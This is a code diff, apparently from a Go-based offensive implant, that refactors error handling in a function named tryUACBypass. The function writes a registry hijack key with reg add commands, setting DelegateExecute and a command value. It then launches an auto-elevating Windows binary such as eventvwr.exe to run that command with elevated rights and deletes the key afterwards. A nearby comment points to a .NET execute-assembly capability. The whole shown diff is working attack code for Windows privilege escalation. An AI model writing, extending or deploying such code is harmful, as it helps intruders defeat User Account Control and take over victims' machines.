@@ -132,11 +132,13 @@ func tryUACBypass(method, cmd string) error {
 		return fmt.Errorf("unknown method")
 	}
 
-	// Set DelegateExecute (empty)
-	_, _ = runShell(fmt.Sprintf(`reg add "%s" /v DelegateExecute /t REG_SZ /d "" /f`, regPath), "cmd.exe")
+	// Set DelegateExecute (empty) — a failure here means the hijack key cannot
+	// be created, so report it instead of silently proceeding.
+	if _, err := runShell(fmt.Sprintf(`reg add "%s" /v DelegateExecute /t REG_SZ /d "" /f`, regPath), "cmd.exe"); err != nil {
+		return fmt.Errorf("set DelegateExecute failed: %w", err)
+	}
 	// Set the command
-	_, err := runShell(fmt.Sprintf(`reg add "%s" /ve /t REG_SZ /d "%s" /f`, regPath, cmd), "cmd.exe")
-	if err != nil {
+	if _, err := runShell(fmt.Sprintf(`reg add "%s" /ve /t REG_SZ /d "%s" /f`, regPath, cmd), "cmd.exe"); err != nil {
 		return err
 	}
 
@@ -151,12 +153,18 @@ func tryUACBypass(method, cmd string) error {
 		trigger = "eventvwr.exe"
 	}
 	if trigger != "" {
-		_, _ = runShell(trigger, "cmd.exe")
+		if _, err := runShell(trigger, "cmd.exe"); err != nil {
+			cleanupUACKey(regPath)
+			return fmt.Errorf("trigger %s failed: %w", trigger, err)
+		}
 	}
 
-	// Cleanup
-	_, _ = runShell(fmt.Sprintf(`reg delete "%s" /f`, regPath), "cmd.exe")
+	cleanupUACKey(regPath)
 	return nil
+}
+
+func cleanupUACKey(regPath string) {
+	_, _ = runShell(fmt.Sprintf(`reg delete "%s" /f`, regPath), "cmd.exe")
 }
 
 // execute-assembly: Load and run .NET assembly
